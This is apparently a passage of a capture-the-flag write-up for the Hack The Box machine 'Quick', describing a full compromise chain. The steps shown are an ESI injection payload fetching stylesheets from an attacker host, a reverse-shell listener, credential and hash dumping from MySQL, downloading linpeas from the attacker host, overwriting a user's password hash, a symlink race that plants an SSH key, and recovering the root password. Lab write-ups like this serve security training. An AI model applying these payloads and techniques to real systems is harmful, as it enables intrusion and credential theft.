+title=a&amp;msg=&lt;esi:include+src="http://10.10.14.75/corshine3.xml"+stylesheet="http://10.10.14.75/corshine3.xsl"&gt;&lt;/esi:include&gt;&amp;id=TKT-1339
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="capture-the-usertxt"><strong><span style="color:#ff5555">Capture the user.txt</span></strong></h2>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>➜  Quick nc -nlvp 1337
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.10.186.
+Ncat: Connection from 10.10.10.186:36834.
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>sam@quick:~$ wc -c user.txt
+33 user.txt
+sam@quick:~$ 
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="escalating-to-the-next-user"><strong><span style="color:#ff5555">Escalating to the next user</span></strong></h2>
+<hr />
+
+<p>There is an interesting file on <code class="language-plaintext highlighter-rouge">/var/www/</code> which the <code class="language-plaintext highlighter-rouge">Esigate</code> is being configured, we check around and found <code class="language-plaintext highlighter-rouge">db.php</code> has credential to log into <strong>mysql</strong>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>sam@quick:/var/www/html$ cat db.php
+&lt;?php
+$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
+?&gt;
+sam@quick:/var/www/html$
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="mysql"><strong><span style="color:#ff5555">MySQL</span></strong></h2>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+</pre></td><td class="rouge-code"><pre>sam@quick:/var/www/html$ mysql -h localhost -u db_adm -p
+Enter password:
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 344
+Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| quick              |
+| sys                |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql&gt; use quick;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++-----------------+
+| Tables_in_quick |
++-----------------+
+| jobs            |
+| tickets         |
+| users           |
++-----------------+
+3 rows in set (0.00 sec)
+
+mysql&gt; select * from users;
++--------------+------------------+----------------------------------+
+| name         | email            | password                         |
++--------------+------------------+----------------------------------+
+| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
+| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
++--------------+------------------+----------------------------------+
+2 rows in set (0.00 sec)
+
+mysql&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>There is another user called <code class="language-plaintext highlighter-rouge">srvadm</code> with <strong>md5</strong> hash password, but I was unable to crack it.</p>
+
+<p>Move on…</p>
+
+<h2 id="run-linpeas"><strong><span style="color:#ff5555">Run Linpeas</span></strong></h2>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre>sam@quick:/var/www/printer$ cd /dev/shm
+sam@quick:/dev/shm$ ls
+sam@quick:/dev/shm$ wget http://10.10.14.75/linpeas.sh
+--2020-08-28 03:49:23--  http://10.10.14.75/linpeas.sh
+Connecting to 10.10.14.75:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 241578 (236K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                                         100%[==============================================================================================================&gt;] 235.92K   799KB/s    in 0.3s
+
+2020-08-28 03:49:23 (799 KB/s) - ‘linpeas.sh’ saved [241578/241578]
+
+sam@quick:/dev/shm$
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And found a lot of informations that pointed out to <strong>printer</strong>.</p>
+
+<p><img src="/images/htb/quick/printer1X.png" alt="" /></p>
+
+<h2 id="printer-domain"><strong><span style="color:#ff5555">Printer Domain</span></strong></h2>
+<hr />
+
+<p>There are 2 files inside <code class="language-plaintext highlighter-rouge">/etc/apache2</code> and on <code class="language-plaintext highlighter-rouge">000-default.conf</code> it shows another subdomain which is <strong>printerv2.quick.htb</strong>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+</pre></td><td class="rouge-code"><pre>sam@quick:/etc/apache2/sites-available$ cat 000-default.conf
+&lt;VirtualHost *:80&gt;
+        # The ServerName directive sets the request scheme, hostname and port that
+        # the server uses to identify itself. This is used when creating
+        # redirection URLs. In the context of virtual hosts, the ServerName
+        # specifies what hostname must appear in the request's Host: header to
+        # match this virtual host. For the default virtual host (this file) this
+        # value is not decisive as it is used as a last resort host regardless.
+        # However, you must set it for any further virtual host explicitly.
+        #ServerName www.example.com
+
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+
+        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+        # error, crit, alert, emerg.
+        # It is also possible to configure the loglevel for particular
+        # modules, e.g.
+        #LogLevel info ssl:warn
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+        # For most configuration files from conf-available/, which are
+        # enabled or disabled at a global level, it is possible to
+        # include a line for only one particular virtual host. For example the
+        # following line enables the CGI configuration for this host only
+        # after it has been globally disabled with "a2disconf".
+        #Include conf-available/serve-cgi-bin.conf
+&lt;/VirtualHost&gt;
+&lt;VirtualHost *:80&gt;
+        AssignUserId srvadm srvadm
+        ServerName printerv2.quick.htb
+        DocumentRoot /var/www/printer
+&lt;/VirtualHost&gt;
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+sam@quick:/etc/apache2/sites-available$
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We add this to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and open the subdomain on browser and we can’t login with <code class="language-plaintext highlighter-rouge">Elisa</code>.</p>
+
+<p>Found out that I have write access to the database, so let’s change the hash of <code class="language-plaintext highlighter-rouge">srvadm</code> to <code class="language-plaintext highlighter-rouge">elisa</code>.</p>
+
+<p><img src="/images/htb/quick/changesrvadmhashX.png" alt="" /></p>
+
+<hr />
+
+<p>And now we can login as <code class="language-plaintext highlighter-rouge">srvadm</code> with <code class="language-plaintext highlighter-rouge">elisa</code> hashes.</p>
+
+<p><img src="/images/htb/quick/loginassrvadmX.png" alt="" /></p>
+
+<hr />
+
+<p>There are only 2 options, we headed to one of the page.</p>
+
+<p><img src="/images/htb/quick/homepageprinterX.png" alt="" /></p>
+
+<h2 id="reverse-shell"><strong><span style="color:#ff5555">Reverse Shell</span></strong></h2>
+<hr />
+
+<p>We can add new printer and set reverse shell to work with that.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>sam@quick:/var/www$ ls -la
+total 20
+drwxr-xr-x  5 root root 4096 Mar 21 03:07 .
+drwxr-xr-x 14 root root 4096 Mar 20 02:10 ..
+drwxr-xr-x  2 root root 4096 Mar 20 03:48 html
+drwxrwxrwx  2 root root 4096 Mar 21 03:11 jobs
+drwxr-xr-x  6 root root 4096 Mar 21 03:08 printer
+sam@quick:/var/www$
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I created <code class="language-plaintext highlighter-rouge">php</code> script to print my <code class="language-plaintext highlighter-rouge">ssh key</code> to the box with one line <code class="language-plaintext highlighter-rouge">bash</code> script as well.
+I sent my ssh-key to the box and do one-line script in order to create <strong>symlink to</strong> <strong>/home/srvadm/.ssh/authorized_keys</strong> and  put my <code class="language-plaintext highlighter-rouge">ssh-key</code> in the <code class="language-plaintext highlighter-rouge">bill details</code>, it has split seconds and it will be deleted, so we need to be <strong>Quick</strong>.</p>
+
+<p>After executing this <code class="language-plaintext highlighter-rouge">script</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>srvadm@quick:/var/www/jobs$ for i in {1..1000};do ln -s /home/srvadm/.ssh/authorized_keys $corshine.php) 2&gt;/dev/null; done
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We need to start our listener, and then I hit print to execute the job and we can see our ssh has been sent to the box, now we can <code class="language-plaintext highlighter-rouge">ssh</code> as <code class="language-plaintext highlighter-rouge">srvadm</code> to the box.</p>
+
+<h2 id="privilege-escalation-to-root"><strong><span style="color:#ff5555">Privilege Escalation to Root</span></strong></h2>
+<hr />
+
+<p>At this moment I decided to run linpeas because this machine kinda overwhelming.</p>
+
+<p><img src="/images/htb/quick/sendlinpeas2X.png" alt="" /></p>
+
+<hr />
+
+<p>We found .cache on the box from <code class="language-plaintext highlighter-rouge">linpeas</code>.</p>
+
+<p><img src="/images/htb/quick/cache1X.png" alt="" /></p>
+
+<hr />
+
+<p>We go ahead to <code class="language-plaintext highlighter-rouge">/home/srvadm/.cache/conf.d/</code> and found <code class="language-plaintext highlighter-rouge">printers.conf</code> and inside the file it consists of <strong>deviceuri</strong> which has <code class="language-plaintext highlighter-rouge">url encoded</code>.</p>
+
+<p>I tried to <code class="language-plaintext highlighter-rouge">decode</code> it online and found password for <strong>root</strong>.</p>
+
+<p><img src="/images/htb/quick/decodeurlX.png" alt="" /></p>
+
+<hr />
+
+<p>Go ahead su as <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p><img src="/images/htb/quick/rootedX.png" alt="" /></p>
+
+<hr />
+
+<p><img src="/images/mandatory/pwned.png" alt="" /></p>
+:ET
